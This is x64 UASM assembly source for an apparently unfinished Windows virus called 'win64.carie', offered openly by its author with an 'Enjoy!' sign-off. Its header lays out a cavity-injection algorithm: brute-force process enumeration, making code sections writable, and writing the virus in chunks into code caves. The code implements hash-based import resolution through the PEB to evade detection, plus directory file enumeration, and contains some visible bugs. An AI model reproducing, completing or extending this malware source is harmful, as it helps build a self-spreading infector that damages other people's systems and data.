;== <win64.carie> - Fractioned Cavity Injection ================================;
;                                                                               ;
; November 2022                                                                 ;
;
; ALgorithm:
;   1. Find target process (brute force)
;       a. Iterate over process IDs
;       b. Open process with generic all
;       c. If allowed, check for infection
;       d. If none, proceed, otherwise, next PID.
;   2. Mark code sections writeable
;   3. Find N caves of V / C size (Virus Size / Chunk Size)
;   4. If N N * C < V then go to next process
;   5. Otherwise, write chunks to each cave
;   6. Write fixup table to cave
;   7. Adjust fixups according to fixup table in each cave
;
;       ~ Enjoy!                                                                ;
; ------------------------------------------------------------------ yesh ----- ;
;===============================================================================;
option win64:0x08, casemap:none, frame:auto, stackbase:rsp
include win.inc
include hash.inc

find_bytes              proto :qword, :qword, :qword, :qword
get_exp                 proto :qword, :qword
get_mod                 proto :qword

get_module_handle_a         typedef proto :qword
get_current_directory       typedef proto :dword, :qword
find_first_file_a           typedef proto :qword, :qword
find_next_file_a            typedef proto :qword, :qword
open_process                typedef proto :dword, :dword, :dword
virtual_query_ex            typedef proto :qword, :qword, :qword, :qword
virtual_protect             typedef proto :qword, :qword, :dword, :qword
read_process_memory         typedef proto :qword, :qword, :qword, :qword, :qword
write_process_memory        typedef proto :qword, :qword, :qword, :qword, :qword
read_file                   typedef proto :qword, :qword, :dword, :qword, :qword
write_file                  typedef proto :qword, :qword, :dword, :qword, :qword
create_file_a               typedef proto :qword, :dword, :dword, :qword, :dword, :dword, :qword


get_current_directory_ptr   typedef ptr get_current_directory
find_first_file_a_ptr       typedef ptr find_first_file_a
find_next_file_a_ptr        typedef ptr find_next_file_a
open_process_ptr            typedef ptr open_process
virtual_query_ex_ptr        typedef ptr virtual_query
virtual_protect_ptr         typedef ptr virtual_protect
read_process_memory_ptr     typedef ptr read_process_memory
write_process_memory_ptr    typedef ptr write_process_memory
read_file_ptr               typedef ptr read_file
write_file_ptr              typedef ptr write_file
create_file_a_ptr           typedef ptr create_file_a

import_table struct 
    fn_popen        qword ?
    fn_rf           qword ?
    fn_wf           qword ?
    fn_cf           qword ?
    fn_fff          qword ?
    fn_fnf          qword ?
    fn_gcd          qword ?
import_table ends

; - Main ------------------------------------------------------------------------

text segment align(16) 'code' read execute 
start proc fastcall
    local k32_base:qword
    local imports:import_table
    local sz_name[256]:byte
    local file_data:find_data
    local handle:qword

setup:
    invoke get_mod, hash_k32_upper_w
    mov     k32_base, rax

    mov     imports.fn_popen, hash_openprocess
    mov     eax, hash_findfirstfilea
    mov     imports.fn_fff, rax
    mov     eax, hash_findnextfilea
    mov     imports.fn_fnf, rax
    mov     eax, hash_getcurrentdirectorya
    mov     imports.fn_gcd, rax
    mov     eax, hash_readfile
    mov     imports.fn_rf, rax
    mov     eax, hash_writefile
    mov     imports.fn_wf, rax
    mov     eax, hash_createfilea
    mov     imports.fn_cf, rax

    ; behold, the expresiveness of UASM. Can NASM do this???
    .for (ebx = 0 : ebx < (sizeof import_table / 8) : ebx++)
        mov     rax, [imports+rbx*8]
        invoke get_exp, k32_base, rax
        mov     [imports+rbx*8], rax
    .endfor
infect:
    invoke get_current_directory ptr imports.fn_gcd, 256, addr sz_name
    lea     rcx, sz_name
    lea     rdx, wildcard
    mov     r8, 2
    call    strcat


    invoke find_first_file_a ptr imports.fn_fff, addr sz_name, addr file_data
    mov     [handle], rax

    .while (eax != 0)
            invoke find_next_file_a ptr imports.fn_fnf, [handle], addr file_data
    .endw


exit:
    ret   
start endp

wildcard:
    db "\*"

; - Functions -------------------------------------------------------------------

; Resolve a DLL export by hash              
get_exp proc base:qword, hash:qword 
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    local   aof:qword
    local   aoo:qword
    local   aon:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     rax, base
    mov     rdi, base
    mov     eax, [rdi].dos_hdr.e_lfanew
    add     rax, base
    lea     rax, [rax].nt_hdr.opt.d_dir
    mov     ebx, [rax].img_data_dir.va
    add     rbx, base
    mov     eax, [rbx].exp_dir.aof
    add     rax, rdi
    mov     aof, rax
    mov     eax, [rbx].exp_dir.aoo
    add     rax, rdi
    mov     aoo, rax
    mov     eax, [rbx].exp_dir.aon
    add     rax, rdi
    mov     aon, rax
    xor     esi, esi
_loop:                                      
    cmp     esi, [rbx].exp_dir.n_names      
    jge     _done                           
    mov     rcx, aon                      
    mov     ecx, [rcx+rsi*4]                
    add     rcx, rdi                       
    mov     rbx, rcx                        
    call    strlen                          
    mov     rcx, rbx                        
    mov     edx, eax
    inc     esi                      
    call    get_hash                    
    cmp     rax, hash                       
    je      _match                          
    jmp     _loop                           
_match:
    dec     rsi                                     
    mov     rcx, aof                       
    mov     eax, [rcx+rsi*4]                
    add     rax, rdi                        
    jmp     _done                           
_done:                                      
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    retn                                    
get_exp endp                                 


; Resolve a module base address by hash     
get_mod proc hash:qword                     
    local   first:qword                     
    local   curr:qword                      
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     @rdi, rdi
    mov     rdi, rcx                        
    mov     rsi, [gs:0x60]                  
    mov     rsi, [rsi].peb.ldr              
    mov     rsi, [rsi].pld.moml.fw-10h      
    mov     first, rsi                      
    mov     rbx, [rsi].ldte.moml.fw-10h     
    mov     curr, rbx                       
_loop:                                      
    lea     rcx, [rbx].ldte.basename.buffer 
    mov     rcx, [rcx]
    xor     edx, edx
    mov     dx, [rbx].ldte.basename.len     
    call    get_hash                         
    cmp     rax, rdi                        
    je      _match                          
    mov     rbx, [curr].ldte.moml.fw-10h    
    mov     rbx, [rbx]
    mov     curr, rbx
    cmp     rbx, first                      
    je      _done                           
    jmp     _loop                           
_match:                                     
    mov     rax, [rbx].ldte.dllbase         
_done:                                      
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    retn                                    
get_mod endp                          

; Get a FNV32 hash of a buffer              
get_hash proc 
    push    rbx
    push    rsi
    push    rdi
    push    r10
    xor     rbx, rbx
    mov     rsi, rcx
    xor     ecx, ecx
    mov     eax, 0811c9dc5h
_loop:
    cmp     ecx, edx
    je      _done
    xor     ebx, ebx
    mov     bl, [rsi+rcx]
    xor     eax, ebx
    mov     edi, 01000193h
    imul    eax, edi
    inc     ecx
    jmp     _loop
_done:
    pop     r10
    pop     rdi
    pop     rsi
    pop     rbx
    ret                          
get_hash endp           

; Find matching bytes in memory
find_bytes proc src:qword, buf:qword, len:qword, max:qword
    local   @rbx:qword
    local   @rsi:qword
    local   @rdi:qword
    local   @r10:qword
    local   res:qword
    mov     @rbx, rbx
    mov     @rsi, rsi
    mov     @rdi, rdi
    mov     @r10, r10
    mov     res, 0
    xor     r10, r10
_loop:
    mov     rcx, r10
    add     rcx, len
    cmp     rcx, max
    ja      _done
    mov     rcx, src
    mov     rdx, buf
    mov     r8, len
    mov     rax, src
    inc     r10
    inc     src
    call    memcmp
    test    eax, eax
    jz      _loop
_done:
    mov     res, rax
    mov     rdi, @rdi
    mov     rdi, @rdi
    mov     rsi, @rsi
    mov     rbx, @rbx
    ret
find_bytes endp

; Generic memcpy
memcmp proc 
    local   @rbx:qword
    mov     @rbx, rbx
    xor     r9, r9
_loop:
    cmp     r9, r8
    je      _done
    xor     eax, eax
    mov     bl, [rcx+r9]
    cmp     [rdx+r9], bl
    jne     _done
_match:
    mov     eax, 1
    inc     r9
    jmp     _loop
_done:
    mov     rbx, @rbx
    ret
memcmp endp

; Calculate length of a string     
strlen proc      
    local   @rbx:qword
    mov     @rbx, rbx          
    xor     eax, eax               
_loop:                             
    mov     bl, [rcx+rax]          
    test    bl, bl                 
    jz      _done                  
    inc     eax                    
    jmp     _loop                  
_done:                             
    mov     rbx, @rbx          
    retn                           
strlen endp             

strcat proc ; dst, src, size
    local   @rbx:qword
    local   @rdx:qword
    local   @rcx:qword
    mov     @rcx,rcx
    mov     @rdx, rdx
    mov     @rbx, rbx

    mov     rbx, rcx
    call    strlen
    mov     rdx, @rdx
    add     rbx, rax
    mov     rcx, rbx
    xor     ebx, ebx
_loop:
    cmp     rbx, r8
    je      _done
    mov     al, [rdx+rbx]
    mov     [rcx+rbx], al
    inc     ebx
    jmp     _loop
_done:
    mov     rcx, @rcx
    mov     rbx, @rbx          
    retn          
strcat endp

text ends                          
end                                

;
; Referencess
;   
; - https://en.wikipedia.org/wiki/CIH_(computer_virus)
; - https://nakedsecurity.sophos.com/2018/04/26/20-years-ago-today-what-we-can-learn-from-the-cih-virus/
;
;
;
;
;
;
;
;
